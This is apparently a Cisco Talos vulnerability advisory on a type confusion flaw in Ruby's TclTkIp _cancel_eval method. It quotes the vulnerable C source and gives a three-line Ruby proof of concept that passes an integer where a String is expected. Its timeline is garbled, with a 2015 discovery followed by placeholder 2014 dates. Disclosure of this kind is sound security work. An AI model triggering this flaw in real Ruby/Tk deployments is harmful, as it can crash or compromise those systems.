Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby TclTkIp class _cancel_eval "ip_cancel_eval" method type confusion vulnerabilities.

:: Description

Type Confusion exists in _cancel_eval Ruby's TclTkIp class method. Attacker passing different type of object than String
as "retval" argument can cause arbitrary code execution.
 

:: Tested Versions

Ruby 2.3.0 dev
Ruby 2.2.2
Tcl/Tk8.6 or later

:: Product URLs

https://www.ruby-lang.org

:: Details

Vulnerable code:

---------------------------------------------- code ---------------------------------------------	
Line 7761	static VALUE
Line 7762	ip_cancel_eval(argc, argv, self)
Line 7763	int   argc;
Line 7764	VALUE *argv;
Line 7765	VALUE self;
Line 7766	{
Line 7767		VALUE retval;
Line 7768
Line 7769		if (rb_scan_args(argc, argv, "01", &retval) == 0) {
Line 7770			retval = Qnil;
Line 7771		}
Line 7772		if (ip_cancel_eval_core(get_ip(self)->ip, retval, 0) == TCL_OK) {
Line 7773			return Qtrue;
Line 7774		} else {
Line 7775			return Qfalse;
Line 7776		}
Line 7777	}

Line 7736	static int
Line 7737	ip_cancel_eval_core(interp, msg, flag)
Line 7738	Tcl_Interp *interp;
Line 7739	VALUE msg;
Line 7740	int flag;
Line 7741	{
Line 7742	#if TCL_MAJOR_VERSION < 8 || (TCL_MAJOR_VERSION == 8 && TCL_MINOR_VERSION < 6)
Line 7743		rb_raise(rb_eNotImpError,
Line 7744				 "cancel_eval is supported Tcl/Tk8.6 or later.");
Line 7745
Line 7746		UNREACHABLE;
Line 7747	#else
Line 7748		Tcl_Obj *msg_obj;
Line 7749
Line 7750		if (NIL_P(msg)) {
Line 7751			msg_obj = NULL;
Line 7752		} else {
Line 7753			msg_obj = Tcl_NewStringObj(RSTRING_PTR(msg), RSTRING_LEN(msg));
Line 7754			Tcl_IncrRefCount(msg_obj);
Line 7755		}
Line 7756
Line 7757		return Tcl_CancelEval(interp, msg_obj, 0, flag);
Line 7758	#endif
Line 7759	}
---------------------------------------------- code ---------------------------------------------	

In line 7769 "_cancel_eval" method argumented is parse out into "retval" variable. Next this variable is passed to 
"ip_cancel_eval_core" function (line 7772). In line 7753 we can see that our "retval" variable which in this function is passed as "msg" argument is
treated as String object.Passing object different than String we will cause type confusion vulnerability in this line.
	
:: PoC

---------------------------------- PoC test.rb ----------------------------------------

require 'tk'
t = TclTkIp.new()
t._cancel_eval(0x11223344)

---------------------------------- PoC test.rb ----------------------------------------

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: Timeline

2015-06-18 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure	